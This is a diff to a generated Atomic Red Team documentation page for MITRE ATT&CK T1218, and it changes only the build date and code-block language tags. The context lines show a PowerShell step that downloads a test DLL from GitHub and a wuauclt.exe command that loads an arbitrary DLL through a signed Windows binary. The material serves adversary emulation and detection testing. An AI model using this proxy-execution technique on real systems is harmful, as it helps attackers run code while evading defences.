@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1218"
 attack_technique_name: "Signed Binary Proxy Execution"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:12"
 executor: "command_prompt"
 aliases:
   - "49fbd548-49e9-4bb7-94a6-3769613912b8"
@@ -52,13 +52,13 @@ DLL to load must exist on disk as specified location (#{arbitrary_dll})
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (test-path "#{arbitrary_dll}"){exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 New-Item -Type Directory (split-path "#{arbitrary_dll}") -ErrorAction ignore | Out-Null
 Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/bin/calc.dll?raw=true" -OutFile "#{arbitrary_dll}"
 ```
@@ -69,13 +69,13 @@ Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/at
 
 ### Command
 
-```commandprompt
+```cmd
 wuauclt.exe /UpdateDeploymentProvider "#{arbitrary_dll}" /RunHandlerComServer
 ```
 
 ### Cleanup
 
-```commandprompt
+```cmd
 taskkill /f /im calculator.exe > nul 2>&1
 ```
 
